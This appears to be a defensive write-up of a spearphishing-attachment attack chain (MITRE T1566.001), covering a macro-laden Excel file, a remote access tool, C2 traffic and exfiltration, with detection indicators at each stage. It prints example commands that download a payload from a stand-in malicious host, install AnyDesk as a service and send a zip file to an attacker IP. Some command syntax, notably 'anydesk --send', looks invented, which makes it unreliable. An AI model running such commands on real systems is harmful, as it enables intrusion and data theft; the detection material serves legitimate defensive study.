Pattern Name: T1566.001 - Spearphishing Attachment

Scenario Overview: This attack scenario illustrates a multi-stage spearphishing campaign where an attacker sends a malicious email with an attachment designed to exploit a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload that establishes a remote access tool on the victim's machine.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Applications Involved**: Outlook
- **User Action**: The user receives an email with a subject line "Important: Invoice Attached" and opens the email.
- **Key Artifacts**: 
  - Email Subject: "Important: Invoice Attached"
  - Attachment: `Invoice_2023.xlsx`
- **Detection Indicators**:
  - Monitor for emails with suspicious subject lines and attachments.
  - Log the opening of emails containing executable file types.

**Stage 2: Opening the Malicious Attachment**
- **Applications Involved**: Microsoft Excel
- **User Action**: The user opens the attachment `Invoice_2023.xlsx`, which contains a macro designed to download and execute a payload.
- **Key Artifacts**: 
  - Excel Macro: `Auto_Open()`
- **Detection Indicators**:
  - Monitor for the execution of macros in Excel files, especially those that download external content.
  - Log the command to execute the macro.

```shell
# Command executed by the Excel macro to download the payload
powershell -Command "Invoke-WebRequest -Uri 'http://malicious-site.com/payload.exe' -OutFile 'C:\Users\Victim\Downloads\payload.exe'"
```

**Stage 3: Execution of the Payload**
- **Applications Involved**: Windows Explorer, PowerShell
- **User Action**: The macro executes a PowerShell command to download a remote access tool (RAT) and saves it to the Downloads folder.
- **Key Artifacts**: 
  - Downloaded File: `payload.exe`
- **Detection Indicators**:
  - Monitor for PowerShell commands that download files from the internet.
  - Log the creation of new executable files in the Downloads directory.

**Stage 4: Establishing Remote Access**
- **Applications Involved**: Windows Services
- **User Action**: The user does not interact further, but the payload executes and installs a remote access tool (e.g., AnyDesk) as a Windows service.
- **Key Artifacts**: 
  - Service Name: `AnyDesk`
- **Detection Indicators**:
  - Monitor for the creation of new Windows services associated with remote access tools.
  - Log service installation events.

```shell
# Command to install AnyDesk as a service
sc create AnyDesk binPath= "C:\Program Files\AnyDesk\AnyDesk.exe" start= auto
```

**Stage 5: Command and Control Communication**
- **Applications Involved**: Network Traffic
- **User Action**: The RAT initiates outbound connections to the attacker's command and control server.
- **Key Artifacts**: 
  - C2 Server IP: `192.0.2.1`
- **Detection Indicators**:
  - Analyze outbound traffic for connections to known malicious IP addresses or unusual ports.
  - Monitor for patterns indicative of C2 communications.

```shell
# Example of network traffic to the C2 server
tcpdump -i eth0 host 192.0.2.1 and port 443
```

**Stage 6: Lateral Movement and Data Exfiltration**
- **Applications Involved**: AnyDesk, File Explorer
- **User Action**: The attacker uses the RAT to move laterally within the network and exfiltrate sensitive data.
- **Key Artifacts**: 
  - Exfiltrated Files: `confidential_data.zip`
- **Detection Indicators**:
  - Monitor for unusual file access patterns and large outbound file transfers.
  - Log AnyDesk sessions initiated from the compromised machine.

```shell
# Command to exfiltrate data using AnyDesk
anydesk --send "C:\Users\Victim\Documents\confidential_data.zip" "192.0.2.1"
```
